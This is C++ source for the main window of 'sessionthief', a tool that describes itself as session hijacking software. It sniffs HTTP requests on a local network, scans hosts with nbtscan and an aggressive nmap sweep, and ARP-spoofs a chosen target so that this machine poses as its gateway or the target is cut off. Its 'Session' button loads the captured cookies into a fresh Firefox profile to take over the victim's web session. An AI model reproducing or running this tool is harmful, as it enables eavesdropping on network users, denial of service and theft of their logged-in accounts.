/*

					 .__		__	 __			  __   .__
  ______ ___________|__|______/  |_  |__|__ __  ____ |  | _|__| ____
 /  ___// ___\_  __ \  \____ \   __\ |  |  |  \/	\|  |/ /  |/ __ \
 \___ \\  \___|  | \/  |  |_> >  |   |  |  |  /   |  \	<|  \  ___/
/____  >\___  >__|  |__|   __/|__/\__|  |____/|___|  /__|_ \__|\___  >
	 \/	 \/		 |__|	  \______|		  \/	 \/	   \/

________________		  ________________		  ________________
\   _  \______  \		 \   _  \______  \		 \   _  \______  \
/  /_\  \  /	/  ______ /  /_\  \  /	/  ______ /  /_\  \  /	/
\  \_/   \/	/  /_____/ \  \_/   \/	/  /_____/ \  \_/   \/	/
 \_____  /____/			\_____  /____/			\_____  /____/
	   \/						\/						\/

[public domain code]
 */

#if defined(__GNUG__) && !defined(__APPLE__)
#pragma implementation "nviewFrame.h"
#endif

#include "nviewFrame.h"
#include "arp.h"

//summaryText include - no circular includes
#include "summaryText.h"
#include "sample.xpm"//no unnecessary defines

IMPLEMENT_CLASS(nviewFrame, wxFrame)

BEGIN_EVENT_TABLE(nviewFrame, wxFrame)
EVT_COMMAND(wxID_ANY, mwEVT_THREAD, nviewFrame::GetPrintThreadMessage)
EVT_COMMAND(wxID_ANY, mwEVT_SUMBOX, nviewFrame::OnTextSumBoxClick)
EVT_COMMAND(wxID_ANY, mwEVT_PROCTHREAD, nviewFrame::GetProcThreadMessage)
EVT_MENU(aprMenuId, nviewFrame::OnAprMenuClick)
EVT_MENU(activeMenu, nviewFrame::OnActiveMenuClick)
EVT_MENU(passiveMenu, nviewFrame::OnPassiveMenuClick)
EVT_MENU(blockMenu, nviewFrame::OnBlockMenuClick)
EVT_MENU(restoreMenu, nviewFrame::OnrestoreMenuClick)
EVT_MENU(interfaceMenu, nviewFrame::OninterfaceMenuClick)
EVT_MENU(portMenu, nviewFrame::OnportMenuClick)
EVT_MENU(firefoxSelectMenu, nviewFrame::OnFirefoxMenuClick)
EVT_MENU(profileSelectMenu, nviewFrame::OnProfileMenuClick)
EVT_MENU(wxID_ABOUT, nviewFrame::OnAboutMenuClick)
EVT_BUTTON(cookieButton, nviewFrame::OnCookiebuttonClick)
EVT_BUTTON(watchButton, nviewFrame::OnWatchbuttonClick)
EVT_BUTTON(clearButton, nviewFrame::OnClearbuttonClick)
END_EVENT_TABLE()

//constructor; initializes non-gui values, calls CreateControls, and prints and gets the interface
nviewFrame::nviewFrame(wxWindow* parent, wxWindowID id, const wxString& caption, 
					   const wxPoint& pos, const wxSize& size, long style) {
	aprRunning = false; // reset apr status
	processRunning = false;
	SystemInterface::portFilter = _T("tcp port 80 or tcp port 8080");
	captureTcp = false;

	//wxStuff
	wxFrame::Create(parent, id, caption, pos, size, style);
	CreateControls();
	Centre();
	SetIcon(sample_xpm);

	// lastly, get interface
	getNewInterface();
}
// reopens the interface chooser
void nviewFrame::OninterfaceMenuClick(wxCommandEvent& WXUNUSED(event)) {
	pcap_freealldevs(SystemInterface::firstdev);
	getNewInterface();
}
//gets new interface
void nviewFrame::getNewInterface(){
	interf = SystemInterface::getInterface();
	bool eth = SystemInterface::isEthernet(interf);
	GetMenuBar()->EnableTop(2,eth);//enable arp menu if ethernet
	if(!eth)
		* textBox << _T("\nNon-ethernet device; ARP stuff disabled.\n");
	if(interf->description && strcmp(interf->description,"file") == 0){
		OnWatchbuttonClick(*((wxCommandEvent*)NULL));
		watchButtonControl->Enable(false);
		GetMenuBar()->EnableTop(1,false);
	}
}
// DESTRUCTOR
nviewFrame::~nviewFrame() {
	if(interf->description && strcmp(interf->description,"file") == 0){
#ifndef WIN32
		wxKill(SystemInterface::tcpdumpPid, wxSIGTERM, NULL, wxKILL_CHILDREN);
		wxRemoveFile(wxString::FromAscii(interf->name));
#endif
	}else{
		pcap_freealldevs(interf);
	}
}

// Control creation for nviewFrame
void nviewFrame::CreateControls() {
	wxBoxSizer* itemBoxSizer2 = new wxBoxSizer(wxVERTICAL);
	this->SetSizer(itemBoxSizer2);

	//make menus
	setupMenu = new wxMenu;
	setupMenu->Append(interfaceMenu,_T("Select &Interface"),_T("Selects an available interface."));
	setupMenu->Append(portMenu,_T("Select &Ports"),_T("Select which ports to monitor."));
	setupMenu->Append(firefoxSelectMenu,_T("Select &Firefox Executable"),_T("Select which executable to run."));
	setupMenu->Append(profileSelectMenu,_T("Select Firefox Profile &Directory"),_T("Select which profile to run firefox in. Select a profile that is not in use!"));
	discoverMenu = new wxMenu;
	discoverMenu->Append(passiveMenu, _T("&Passive host discover"),_T("Displays IPs of hosts seen on network."));
	discoverMenu->Append(activeMenu, _T("&Active host discover"),_T("Scans IPs on subnet."));
	aprMenu = new wxMenu;
	aprMenu->Append(restoreMenu, _T("&Restore"), _T("Restores the target's gateway"));
	aprMenu->Append(aprMenuId, _T("&APR"), _T("Spoof the target into believing this computer is the gateway"));
	aprMenu->Append(blockMenu, _T("&Block"), _T("Spoof the target into believing no computer is the gateway"));
	helpMenu = new wxMenu;
	helpMenu->Append(wxID_ABOUT, _T("&About\tF1"), _T("About sessionthief"));

	//Make menu bar out of menus
	wxMenuBar* menuBar = new wxMenuBar( wxMB_DOCKABLE );
	menuBar->Append(setupMenu, _T("&Setup"));
	menuBar->Append(discoverMenu, _T("&Discover"));
	menuBar->Append(aprMenu, _T("&ARP"));
	menuBar->Append(helpMenu, _T("&Help"));
	SetMenuBar(menuBar);

	// labels
	wxBoxSizer* lblSizer = new wxBoxSizer(wxHORIZONTAL);
	itemBoxSizer2->Add(lblSizer, 0, wxGROW | wxALL, 5);
	wxStaticText* label1 = new wxStaticText(this, label1ID, _T("HTTP requests"));
	lblSizer->Add(label1, 1, wxGROW | wxALL, 5);
	wxStaticText* label2 = new wxStaticText(this, label2ID, _T("Pages"));
	lblSizer->Add(label2, 1, wxGROW | wxALL, 5);

	//text boxes
	wxBoxSizer* txtSizer = new wxBoxSizer(wxHORIZONTAL);
	itemBoxSizer2->Add(txtSizer, 4, wxGROW | wxALL, 5);
	textBox = new wxTextCtrl(this, txtView, _T(""), wxDefaultPosition, 
		wxDefaultSize, wxTE_MULTILINE | wxHSCROLL);
	textBox->SetEditable(false);
	txtSizer->Add(textBox, 4, wxGROW | wxALL, 5);
	textSumBox = new SummaryText(this, txtSummary, _T(""), wxDefaultPosition,
		wxDefaultSize, wxTE_MULTILINE | wxHSCROLL | wxTE_RICH);
	textSumBox->SetEditable(false);
	txtSizer->Add(textSumBox, 4, wxGROW | wxALL, 5);

	// buttons and ip box
	wxBoxSizer* buttonSizer = new wxBoxSizer(wxHORIZONTAL);
	itemBoxSizer2->Add(buttonSizer, 0, wxGROW | wxALL, 5);
	watchButtonControl = new wxButton(this, watchButton, _T("Watch"));
	buttonSizer->Add(watchButtonControl, 0, wxALIGN_CENTER_VERTICAL | wxALL, 5);
	cookieButtonControl = new wxButton(this, cookieButton, _T("Session"));
	buttonSizer->Add(cookieButtonControl, 0, wxALIGN_CENTER_VERTICAL | wxALL, 5);
	clearButtonControl = new wxButton(this, clearButton, _T("Clear"));
	buttonSizer->Add(clearButtonControl, 0, wxALIGN_CENTER_VERTICAL | wxALL, 5);
	ipBox = new wxTextCtrl(this, txtIp, _T("ip address"));
	buttonSizer->Add(ipBox, 1, wxALIGN_CENTER_VERTICAL | wxALL, 5);
}
//gets process thread message; simply displays on the text box
void nviewFrame::GetProcThreadMessage(wxCommandEvent & evt) {
	textBox->AppendText(evt.GetString());
}
//gets new data packet from print thread to print
void nviewFrame::GetPrintThreadMessage(wxCommandEvent & evt) {
	Request* tmpReq = (Request *) evt.GetClientData();

	//output url to text boxes. wxBug: AppendText() does not always work; line limit or just MSW
	//being dumb; it sometimes works when tried again, so try
	long before = textSumBox->GetLastPosition();
	textSumBox->AppendText(tmpReq->URL);
	if (textSumBox->GetLastPosition() < before + (long)tmpReq->URL.length()) {
		textSumBox->Remove(before, textSumBox->GetLastPosition());
		textSumBox->AppendText(tmpReq->URL);
		//if it still doesn't work, remove added stuff and abort.
		if(textSumBox->GetLastPosition() < before + (long)tmpReq->URL.length()){
			textSumBox->Remove(before, textSumBox->GetLastPosition());
			delete tmpReq;
			return;
		}
	}
	requests.push_back(*tmpReq); // add to list
	textBox->ChangeValue(tmpReq->HTTP); // display data and IP
	ipBox->ChangeValue(SystemInterface::ipToString(tmpReq->IP));
	delete tmpReq; // just a temporary data holder
}

// display pos'th GET
void nviewFrame::OnTextSumBoxClick(wxCommandEvent & WXUNUSED(event)) {
	//each line is one request; get the line number (pos) and retrieve the request
	long pos, x;
	if (!textSumBox->PositionToXY(textSumBox->GetInsertionPoint(), &x, &pos) || pos >= (long)requests.size())
		return; // out of bounds
	textBox->ChangeValue(requests.at(pos).HTTP); // put HTTP in the text box
	ipBox->ChangeValue(SystemInterface::ipToString(requests.at(pos).IP)); // and IP in the ip box
	textBox->SetSelection(-1, -1);
}

//runs a process and prints its stdout
void nviewFrame::PrintProcess(const wxString& command){
	* textBox << command<< _T("\n");
	wxProcess* proc = wxProcess::Open(command);
	if(proc == NULL){
		* textBox << _T("ERROR CANNOT RUN ")<< command<< _T("\n");
		return;
	}
	wxInputStream* is = proc->GetInputStream();
	wxString s = _T("");
	char buf[128];
	while(!is->Eof()){
		is->Read(buf,128);
		s.append(wxString::FromUTF8(buf,is->LastRead()));
	}
	* textBox << s;
}

//starts passive packet watch, show nbtstat cache
void nviewFrame::OnPassiveMenuClick(wxCommandEvent& WXUNUSED(event)) {
#ifdef WIN32 //there is no such thing as nbtstat for linux. (afaik)
	//run an nbtstat name cache dump and list ip's of first 50 packets
	* textBox << _T("\nDumping netbios name cache\n");
	//nbtstat cache dump
	PrintProcess(_T("nbtstat -c"));
#endif
	* textBox << _T("\nListening for packets, this could take a while...\n");
	// listen for ip's
	SystemInterface::printIps(textBox, interf);
}

// prints an nbtscan, and an nmap host discover of the subnet to the main window
// nmap can take longer, so we don't wait for it and run it in another thread.
void nviewFrame::OnActiveMenuClick(wxCommandEvent& WXUNUSED(event)) {
	//get ip/netmask for nbtscan and nmap which need 192.168.1.1/24 style commands
	wxString ipthing = SystemInterface::getLocalIp(interf) + _T("/");
	ipthing << SystemInterface::getNetmaskBits(interf);
	//nbtscan
	* textBox << _T("\nRunning nbtscan of subnet\n");
	PrintProcess(_T("nbtscan ") + ipthing);

	if (processRunning) //don't run nmap if nmap already running
		return;
	* textBox << _T("\nRunning nmap host discover on subnet\n");

	//run nmap!	 nmap -T Aggressive -sP 192.168.1.1/24	for example
	ProcessThread *nmpThread = new ProcessThread();
	if (nmpThread->Create(_T("nmap -T Aggressive -sP ") + ipthing, &processRunning, textBox) == wxTHREAD_NO_ERROR) {
		nmpThread->Run();
	} else {
		* textBox << _T("nmap thread create failed\n");
		delete nmpThread;
	}
}

// handles an apr attack
void nviewFrame::OnAprMenuClick(wxCommandEvent& WXUNUSED(event)) {
	bool forward = true;
#ifdef WIN32
	DWORD data = 0;
	HKEY hand;
	DWORD int4=4;
	DWORD type = REG_DWORD;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",0,KEY_QUERY_VALUE,&hand);
	RegQueryValueExA(hand,"IPEnableRouter",0,&type,(LPBYTE)&data,&int4);
	if(data != 0)
		if(wxMessageBox(wxString::FromAscii("IP forwarding apparently enabled. Allow OS to forward?\n"
				"\nTo disable IP forwarding, run this and reboot:\n"
				"reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f"),
				wxString::FromAscii("IP forwarding check failed"),wxYES_NO|wxCANCEL,this)
				== wxYES)
			forward = false;
#endif
	aprRunning = !aprRunning; // toggle apr running

	if (!aprRunning) {
		aprMenu->FindItemByPosition(1)->SetItemLabel(_T("APR"));
		return;
	}
	aprMenu->FindItemByPosition(1)->SetItemLabel(_T("Stop APR"));	
	try{
		ArpThread::startAprThread(ipBox->GetValue(), interf, textBox, &aprRunning, forward);
	}catch(wxChar* errorMsg){
		*textBox << errorMsg;
		aprMenu->FindItemByPosition(1)->SetItemLabel(_T("APR"));
		aprRunning = false;
	}
}

// sends a snipe to the target.
void nviewFrame::OnBlockMenuClick(wxCommandEvent& WXUNUSED(event)) {
	ArpThread::sendTargetedArp(ipBox->GetValue(), interf, textBox,"\xFE\xED\xCA\xFE\xBE\xEF");
}

// sends an "undo" snipe to the target
void nviewFrame::OnrestoreMenuClick(wxCommandEvent& WXUNUSED(event)) {
	ArpThread::sendTargetedArp(ipBox->GetValue(), interf, textBox);
}

// launches cookie eater
void nviewFrame::OnCookiebuttonClick(wxCommandEvent & WXUNUSED(event)) {
	//each line is one request; get the line number (pos) and retrieve the request
	long pos, x;
	if (!textSumBox->PositionToXY(textSumBox->GetInsertionPoint(), &x, &pos) || pos >= (long)requests.size())
		return; // out of bounds
	CookieEater::eatCookies(requests.at(pos).HTTP);
}

// asks for port list, parse comma separated list
void nviewFrame::OnportMenuClick(wxCommandEvent& WXUNUSED(event)) {
	wxTextEntryDialog dialog(this, _T("Enter the ports to watch"), _T("Port entry"), 
		_T("80,8080"), wxOK | wxCANCEL);
	if (dialog.ShowModal() != wxID_OK)
		return;
	wxString entry = dialog.GetValue();
	int indx;// if this is an invalid list, pcap will not compile it. no error checking here.
	SystemInterface::portFilter = _T("tcp port ");
	while ((indx = entry.Find(_T(","))) != -1) {
		SystemInterface::portFilter.append(entry.substr(0, indx));
		entry.erase(0, indx + 1);
		SystemInterface::portFilter.append(_T(" or tcp port "));
	}
	SystemInterface::portFilter.append(entry);
}

// toggle watching traffic (controls traffic watching thread)
void nviewFrame::OnWatchbuttonClick(wxCommandEvent& WXUNUSED(event)) {
	//toggle whether buttons enabled
	setupMenu->Enable(interfaceMenu, captureTcp);
	setupMenu->Enable(portMenu, captureTcp);
	captureTcp = !captureTcp; // if we are capturing, stop and vice versa
	if (!captureTcp) {
		watchButtonControl->SetLabel(_T("Watch"));
		return;
	}
	watchButtonControl->SetLabel(_T("Stop Watch"));

	// If it is a valid IP, watch that IP otherwise watch all
	u_int targetIp = inet_addr(ipBox->GetValue().ToAscii());
	if (targetIp != (u_int)(-1))
		* textBox << _T("starting ip watch on ") << ipBox->GetValue() << _T("\n");
	else 
		* textBox << ipBox->GetValue() << _T(" not valid IP; starting watch on all visible http requests\n");

	// Get new thread for watching
	PrintThread * thread = new PrintThread(&captureTcp, interf, targetIp, this);
	if (thread->Create() == wxTHREAD_NO_ERROR){
		thread->Run();
	} else {
		* textBox << _T("ERROR create thread failed\n");
		delete thread;
	}
}

// toggle watching traffic (controls traffic watching thread)
void nviewFrame::OnClearbuttonClick(wxCommandEvent& WXUNUSED(event)) {
	textBox->Clear();
	textSumBox->Clear();
	requests.clear();
}

//show about dialog
void nviewFrame::OnAboutMenuClick(wxCommandEvent& WXUNUSED(event)){
	wxAboutDialogInfo info;
	info.SetName(_("sessionthief"));
	info.SetVersion(_("1.5"));
	info.SetDescription(_("Session hijacking for the impatient."));
	info.SetCopyright(_T("(C) 2007-2011 scriptjunkie <scriptjunkie@scriptjunkie.us>"));
	info.AddDeveloper(_T("scriptjunkie"));

	wxAboutBox(info);
}

//choose which firefox to execute
void nviewFrame::OnFirefoxMenuClick(wxCommandEvent& WXUNUSED(event)){
	const wxString& ffox = wxFileSelector(_T("Choose your executable to be started."),
			_T(""),CookieEater::ffoxExecutable,_T(""),_T("*"),0,this);
	if(!ffox.empty())
		CookieEater::ffoxExecutable = ffox;
}

//choose which profile to fill
void nviewFrame::OnProfileMenuClick(wxCommandEvent& WXUNUSED(event)){
	const wxString& prefs = wxDirSelector(_T("Choose your settings folder.")
				_T("\r\nNote: A new profile will be create for each session that is stolen. ")
				_T("\r\nThis folder only specifies which profile to take a minimal number of settings from."),
			CookieEater::settingsFolder,0,wxDefaultPosition,this);
	if(!prefs.empty())
		CookieEater::settingsFolder = prefs;
}
